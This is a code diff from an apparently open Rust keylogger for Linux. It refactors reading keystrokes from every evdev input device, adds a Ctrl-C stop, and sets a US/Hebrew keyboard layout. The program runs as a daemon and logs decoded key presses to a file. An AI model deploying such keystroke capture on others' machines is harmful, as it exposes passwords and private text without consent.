@@ -6,16 +6,17 @@ use std::{
 use anyhow::{bail, Context, Result};
 use chrono::{DateTime, Local};
 use daemonize::{Daemonize, Outcome};
-use evdev::{Device, InputEvent, InputEventKind, Key, LedType};
+use evdev::{InputEventKind, Key, LedType};
 use log::{debug, error, info, trace};
 use rustix::process::{kill_process, Pid, RawPid, Signal};
-use tokio::{
-    sync::mpsc::{self, Receiver},
-    task::JoinSet,
-};
+use tokio::select;
 use xkbcommon::xkb::{
     self, keysyms::KEY_NoSymbol, KeyDirection, Keycode, Keymap, State, CONTEXT_NO_FLAGS,
 };
+
+use crate::device_listeners::Listeners;
+
+mod device_listeners;
 
 const PID_FILE_PATH: &str = "/run/keylogger.pid";
 
@@ -51,7 +52,7 @@ pub fn create(log_file: std::fs::File) -> Result<()> {
 ///
 /// # Errors
 ///
-/// Returns if any part of the keylogger encountered a fatal error.
+/// Returns if any part of the keylogger encountered a fatal error or if the process was stopped
 pub fn start(log_file: std::fs::File) -> Result<()> {
     tokio::runtime::Builder::new_multi_thread()
         .enable_all()
@@ -60,24 +61,24 @@ pub fn start(log_file: std::fs::File) -> Result<()> {
         .block_on(async { start_logger(log_file).await })
 }
 
+#[allow(clippy::redundant_pub_crate)]
 async fn start_logger(log_file: std::fs::File) -> Result<()> {
     trace!("keylogger starting");
-    let devices: Vec<Device> = evdev::enumerate().map(|t| t.1).collect();
+    let listeners = Listeners::spawn()?;
 
-    if devices.is_empty() {
-        bail!("Coundn't find any device. Missing sudo?");
+    let event_reader_handle =
+        tokio::task::spawn_blocking(move || event_reader(listeners, log_file));
+
+    select! {
+        _ = event_reader_handle => {
+            error!("Event reader was closed");
+        }
+        _ = tokio::signal::ctrl_c() => {
+            error!("Ctrl-C was pressed");
+        }
     }
-    trace!("Found {} devices", devices.len());
 
-    let (rx, mut join_set) = spawn_device_listeners(devices);
-
-    join_set.spawn_blocking(move || event_reader(rx, log_file));
-
-    if let Some(result) = join_set.join_next().await {
-        result??;
-    }
-
-    bail!("Unkown error occured");
+    bail!("Keylogger was stopped");
 }
 
 const LEDS: [LedType; 3] = [LedType::LED_CAPSL, LedType::LED_NUML, LedType::LED_SCROLLL];
@@ -89,7 +90,7 @@ fn get_keyboard_state() -> Result<(State, Keymap)> {
         &context,
         "",                                       // rules
         "pc104",                                  // model
-        "us",                                     // layout
+        "us,il",                                  // layout
         "basic",                                  // variant
         Some("grp:win_space_toggle".to_string()), // options
         xkb::COMPILE_NO_FLAGS,
@@ -128,26 +129,6 @@ fn get_keyboard_state() -> Result<(State, Keymap)> {
     Ok((state, keymap))
 }
 
-fn spawn_device_listeners(devices: Vec<Device>) -> (Receiver<InputEvent>, JoinSet<Result<()>>) {
-    let (tx, rx) = mpsc::channel(32);
-    let mut join_set = JoinSet::<Result<()>>::new();
-
-    for device in devices {
-        let tx = tx.clone();
-        join_set.spawn(async move {
-            let mut stream = device
-                .into_event_stream()
-                .context("Failed to create device stream")?;
-            loop {
-                let event = stream.next_event().await.context("Failed to read event")?;
-                tx.send(event).await.context("Failed to send event")?;
-            }
-        });
-    }
-
-    (rx, join_set)
-}
-
 #[derive(PartialEq)]
 enum KeyEventType {
     KeyPress,
@@ -163,11 +144,11 @@ fn key_to_keycode(key: Key) -> Keycode {
     (u32::from(key.0) + 8).into()
 }
 
-fn event_reader(mut rx: Receiver<InputEvent>, mut log_file: std::fs::File) -> Result<()> {
+fn event_reader(mut listeners: Listeners, mut log_file: std::fs::File) -> Result<()> {
     let (mut state, keymap) =
         get_keyboard_state().context("Failed to initialize keyboard state")?;
 
-    while let Some(eventr) = rx.blocking_recv() {
+    while let Some(eventr) = listeners.next_event() {
         let InputEventKind::Key(key) = eventr.kind() else {
             continue;
         };
